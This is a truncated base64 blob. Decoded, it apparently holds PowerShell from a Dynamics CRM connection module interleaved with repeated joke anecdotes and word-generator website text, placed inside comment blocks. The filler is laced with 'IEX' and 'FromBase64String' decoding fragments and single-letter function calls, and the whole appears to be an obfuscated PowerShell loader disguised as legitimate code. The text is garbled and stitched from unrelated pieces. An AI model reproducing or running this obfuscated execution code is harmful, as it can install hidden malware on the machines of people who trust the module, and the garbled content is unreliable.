B0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiBzIHsKICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmc6IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLlRyYWNlQ29udHJvbFNldHRpbmdzXTo6Q2xvc2VMaXN0ZW5lcnMoKSIKICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLlRyYWNlQ29udHJvbFNldHRpbmdzXTo6Q2xvc2VMaXN0ZW5lcnMoKQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhcnkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBuKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIG4oKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gZigpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBEZWRpY2F0aW9uU291cmNlIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgbigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiB0IHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSggCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4KICAgICkKICAgIHRyeXsKICAgICAgICAkZGVmYXVsdFByb3BzQ3JtU2VydmljZUNsaWVudCA9IEAoCiAgICAgICAgICAgICdJc1JlYWR5JywKICAgICAgICAgICAgJ0lzQmF0Y2hPcGVyYXRpb25zQXZhaWxhYmxlJywKICAgICAgICAgICAgJ01heFJldHJ5Q291bnQnLAogICAgICAgICAgICAnUmV0cnlQYXVzZVRpbWUnLCAKICAgICAgICAgICAgJ0F1dGhvcml0eScsCiAgICAgICAgICAgICdBY3RpdmVBdXRoZW50aWNhdGlvblR5cGUnLAogICAgICAgICAgICAnT0F1dGhVc2VySWQnLAogICAgICAgICAgICAnVGVuYW50SWQnLAogICAgICAgICAgICAnRW52aXJvbm1lbnRJZCcsCiAgICAgICAgICAgICdDb25uZWN0ZWRPcmdJZCcsCiAgICAgICAgICAgICdDcm1Db25uZWN0T3JnVXJpQWN0dWFsJywKICAgICAgICAgICAgJ0Nvbm5lY3RlZE9yZ0ZyaWVuZGx5TmFtZScsCiAgICAgICAgICAgICdDb25uZWN0ZWRPcmdVbmlxdWVOYW1lJywKICAgICAgICAgICAgJ0Nvbm5lY3RlZE9yZ1ZlcnNpb24nLAogICAgICAgICAgICAnU2RrVmVyc2lvblByb3BlcnR5JywKICAgICAgICAgICAgJ0NhbGxlcklkJywKICAgICAgICAgICAgJ0NhbGxlckFBRE9iamVjdElkJywKICAgICAgICAgICAgJ0Rpc2FibGVDcm9zc1RocmVhZFNhZmV0aWVzJywKICAgICAgICAgICAgJ1Nlc3Npb25UcmFja2luZ0lkJywKICAgICAgICAgICAgJ0ZvcmNlU2VydmVyTWV0YWRhdGFDYWNoZUNvbnNpc3RlbmN5JywgCiAgICAgICAgICAgICdMYXN0Q3JtRXJyb3InCiAgICAgICAgKQogICAgICAgICRkZWZhdWx0UHJvcHNTZXRDcm1TZXJ2aWNlQ2xpZW50PU5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU1Byb3BlcnR5U2V0KCdEZWZhdWx0RGlzcGxheVByb3BlcnR5U2V0Jyxbc3RyaW5nW11dJGRlZmF1bHRQcm9wc0NybVNlcnZpY2VDbGllbnQpCiAgICAgICAgJFBTU3RhbmRhcmRNZW1iZXJzID0gW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNNZW1iZXJJbmZvW11dQCgkZGVmYXVsdFByb3BzU2V0Q3JtU2VydmljZUNsaWVudCkKICAgICAgICAkY29ubnwgQWRkLU1lbWJlciBNZW1iZXJTZXQgUFNTdGFuZGFyZE1lbWJlcnMgJFBTU3RhbmRhcmRNZW1iZXJzIC1Gb3JjZQogICAgfUNhdGNoewogICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBzZXQgYSBuZXcgUFNTdGFuZGFyZE1lbWJlciBvbiBjb25uZWN0aW9uIG9iamVjdCIKICAgIH0KfWZ1bmN0aW9uIFZlcmlmeUNybUNvbm5lY3Rpb25QYXJhbSB7CglbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtU2VydmljZUNsaWVudF0kY29ubiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRwaXBlbGluZVZhbHVlCiAgICApCiAgICAjd2UgaGF2ZSBhICRjb25uIHZhbHVlIGFuZCB3ZSB3ZXJlIG5vdCBnaXZlbiBhICRjb25uIHZhbHVlIHNvIHdlIHNob3VsZCB0cnkgdG8gZmluZCBvbmUKICAgIGlmKCRjb25uIC1lcSAkbnVsbCAtYW5kICRwaXBlbGluZVZhbHVlIC1lcSAkZmFsc2UpCiAgICB7CiAgICAgICAgJGNvbm5vYmogPSBHZXQtVmFyaWFibGUgY29ubiAtU2NvcGUgZ2xvYmFsIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgaWYoJGNvbm5vYmouVmFsdWUgLWVxICRudWxsKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgJ0EgY29ubmVjdGlvbiB0byBDUk0gaXMgcmVxdWlyZWQsIHVzZSBHZXQtQ3JtQ29ubmVjdGlvbiBvciBvbmUgb2YgdGhlIG90aGVyIGNvbm5lY3Rpb24gZnVuY3Rpb25zIHRvIGNvbm5lY3QuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkY29ubiA9ICRjb25ub2JqLlZhbHVlCiAgICAgICAgfQogICAgfWVsc2VpZigkY29ubiAtZXEgJG51bGwgLWFuZCAkcGlwZWxpbmVWYWx1ZSAtZXEgJHRydWUpewogICAgICAgIHRocm93ICJDb25uZWN0aW9uIG9iamVjdCBwcm92aWRlZCBpcyBudWxsIgogICAgfQoJcmV0dXJuICRjb25uCn0KPCM+PgpTcD1lbGxpbmcgYW5kIFZvY2FidWxhcnkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgYygpIG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgbigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBuKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGYoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgRGVkaWNhdGlvblNvdX